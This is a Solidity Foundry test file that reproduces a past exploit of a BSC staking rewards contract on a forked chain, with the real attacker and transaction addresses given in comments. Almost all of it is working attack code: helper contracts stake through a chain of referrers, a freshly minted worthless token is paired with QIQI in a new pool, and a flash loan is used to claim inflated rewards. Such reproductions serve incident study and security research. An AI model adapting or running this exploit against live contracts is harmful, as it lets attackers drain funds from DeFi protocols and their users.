// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";

import {IUniswapV2Factory} from "src/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
import {IUniswapV3Pair} from "src/interfaces/IUniswapV3Pair.sol";

import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
// @KeyInfo - Total Lost : unclear US$
// Attacker : https://bscscan.com/address/0xa3aa817587556c023e78b2285d381c68cee17069
// Attack Contract : https://bscscan.com/address/0x9a366027e6be5ae8441c9f54455e1d6c41f12e3c
// Attack Contract : https://bscscan.com/address/0xc2f54422c995f6c2935bc52b0f55a03c2f3e429c
// Vulnerable Contract : https://bscscan.com/address/0xeaf83465025b4bf9020fdf9ea5fb6e71dc8a0779
// Attack Tx : https://bscscan.com/tx/0xfe80df5d689137810df01e83b4bb51409f13c865e37b23059ecc6b3d32347136
// Attack Tx : https://bscscan.com/tx/0x8a453c61f0024e8e11860729083088507a02a38100da8b0c3b2d558788662fa0

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xeaf83465025b4bf9020fdf9ea5fb6e71dc8a0779#code

// @Analysis
// Post-mortem : https://www.google.com/
// Twitter Guy : https://twitter.com/BlockSecTeam/status/1657715018908180480
// Hacking God : https://www.google.com/

interface IStakingRewards {

    function stake(address token, address token1, address token2, address up, uint256 amount) external;
    function claim(address token, address token1) external;

}

contract ContractTest is Test {

    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 SELLC = IERC20(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4);
    IERC20 QIQI = IERC20(0x0B464d2C36d52bbbf3071B2b0FcA82032DCf656d);
    IUniswapV3Pair Pair = IUniswapV3Pair(0x4B1aC1E4B828EBC81FcaC587BEf64e4aDd1dBCEc);
    IUniswapV2Router Router = IUniswapV2Router(payable(0xBDDFA43dbBfb5120738C922fa0212ef1E4a0850B));
    IUniswapV2Factory Factory = IUniswapV2Factory(0x2c37655f8D942f2411d9d85a5FE580C156305070);
    IStakingRewards StakingRewards = IStakingRewards(0xeaF83465025b4Bf9020fdF9ea5fB6e71dC8a0779);
    TOKENA TokenA;
    Exploiter exploiter;
    IUniswapV2Pair pair;
    address[] expoiterList;

    function setUp() public {
        vm.createSelectFork("bsc", 28_187_317);
        vm.label(address(USDT), "USDT");
        vm.label(address(QIQI), "QIQI");
        vm.label(address(SELLC), "SELLC");
        vm.label(address(Pair), "Pair");
        vm.label(address(Router), "Router");
        vm.label(address(Factory), "Factory");
        vm.label(address(StakingRewards), "StakingRewards");
    }

    function testExploit() public {
        deal(address(USDT), address(this), 1000 * 1e18);
        stakeFactory(10);

        vm.warp(block.timestamp + 60 * 60);

        TokenA = new TOKENA();
        TokenA.mint(100);
        Pair.flash(address(this), 10_000 * 1e18, 0, new bytes(1));

        emit log_named_decimal_uint(
            "Attacker QIQI balance after exploit", QIQI.balanceOf(address(this)), QIQI.decimals()
        );
    }

    function stakeFactory(uint256 amount) internal {
        address account;
        for (uint256 i; i < amount; i++) {
            exploiter = new Exploiter();
            expoiterList.push(address(exploiter));
            USDT.transfer(address(exploiter), 100 * 1e18);
            if (i == 0) {
                account = address(0xa3aa817587556C023e78B2285D381C68CEe17069);
            } else {
                account = expoiterList[i - 1];
            }
            exploiter.stake(account);
        }
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        QIQI.approve(address(Router), QIQI.balanceOf(address(this)));
        TokenA.approve(address(Router), TokenA.balanceOf(address(this)));
        Router.addLiquidity(
            address(QIQI),
            address(TokenA),
            QIQI.balanceOf(address(this)),
            TokenA.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp
        );
        claimFactory(10);
        pair = IUniswapV2Pair(Factory.getPair(address(QIQI), address(TokenA)));
        pair.approve(address(Router), pair.balanceOf(address(this)));
        Router.removeLiquidity(
            address(QIQI), address(TokenA), pair.balanceOf(address(this)), 0, 0, address(this), block.timestamp
        );
        QIQI.transfer(address(Pair), 10_100 * 1e18);
    }

    function claimFactory(uint256 amount) internal {
        for (uint256 i; i < amount; i++) {
            exploiter = Exploiter(expoiterList[i]);
            exploiter.claim(address(TokenA));
        }
    }

}

contract Exploiter {

    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 SELLC = IERC20(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4);
    IERC20 QIQI = IERC20(0x0B464d2C36d52bbbf3071B2b0FcA82032DCf656d);
    IStakingRewards StakingRewards = IStakingRewards(0xeaF83465025b4Bf9020fdF9ea5fB6e71dC8a0779);

    function stake(address account) external {
        USDT.approve(address(StakingRewards), USDT.balanceOf(address(this)));
        StakingRewards.stake(address(QIQI), address(SELLC), address(USDT), account, USDT.balanceOf(address(this)));
    }

    function claim(address _recipient) external {
        StakingRewards.claim(address(QIQI), _recipient);
        QIQI.transfer(msg.sender, QIQI.balanceOf(address(this)));
    }

}

contract TOKENA {

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "TokenA";
    string public symbol = "TokenA";
    uint8 public decimals = 18;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address recipient, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(uint256 amount) external {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function burn(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }

}
